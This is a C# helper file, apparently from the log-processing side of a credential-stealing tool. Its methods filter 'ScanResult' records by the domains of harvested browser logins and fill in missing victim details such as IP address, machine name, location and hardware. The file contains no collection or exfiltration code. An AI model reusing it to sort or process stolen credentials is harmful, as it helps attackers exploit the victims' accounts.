using System;
using System.Collections.Generic;
using System.Linq;
using WindowsSDK.Objects.Browsers;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Extensions
{
    public static class Extensions
    {
        public static IEnumerable<T> DistinctBy<T, TKey>(this IEnumerable<T> items, Func<T, TKey> property)
        {
            return from x in items.GroupBy(property)
                   select x.First();
        }

        public static T ChangeType<T>(this object @this)
        {
            return (T)Convert.ChangeType(@this, typeof(T));
        }

        public static string StripQuotes(this string value)
        {
            return value.Replace("\"", string.Empty);
        }

        public static bool ContainsDomains(this ScanResult log, string domains)
        {
            if (string.IsNullOrWhiteSpace(domains))
            {
                return true;
            }
            string[] array = domains.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
            if (array != null && array.Length == 0)
            {
                return true;
            }
            IEnumerable<Account> enumerable = log.ScanDetails?.Browsers?.Where((ScannedBrowser x) => x.Logins != null)?.SelectMany((ScannedBrowser x) => x.Logins);
            if (enumerable == null)
            {
                return false;
            }
            if (enumerable.Count() == 0)
            {
                return false;
            }
            foreach (Account item in enumerable)
            {
                string[] array2 = array;
                foreach (string value in array2)
                {
                    if (item.URL.Contains(value))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static void ReplaceEmptyValues(this ScanResult log)
        {
            log.City = log.City.IsNull("UNKNOWN");
            log.Country = log.Country.IsNull("UNKNOWN");
            log.FileLocation = log.FileLocation.IsNull("UNKNOWN");
            log.Hardware = log.Hardware.IsNull("UNKNOWN");
            log.IPv4 = log.IPv4.IsNull("UNKNOWN");
            log.Language = log.Language.IsNull("UNKNOWN");
            log.MachineName = log.MachineName.IsNull("UNKNOWN");
            log.OSVersion = log.OSVersion.IsNull("UNKNOWN");
            log.ScreenSize = log.ScreenSize.IsNull("UNKNOWN");
            log.TimeZone = log.TimeZone.IsNull("UNKNOWN");
            log.ZipCode = log.ZipCode.IsNull("UNKNOWN");
            log.ScanDetails = log.ScanDetails.IsNull(new ScanDetails());
        }
    }
}
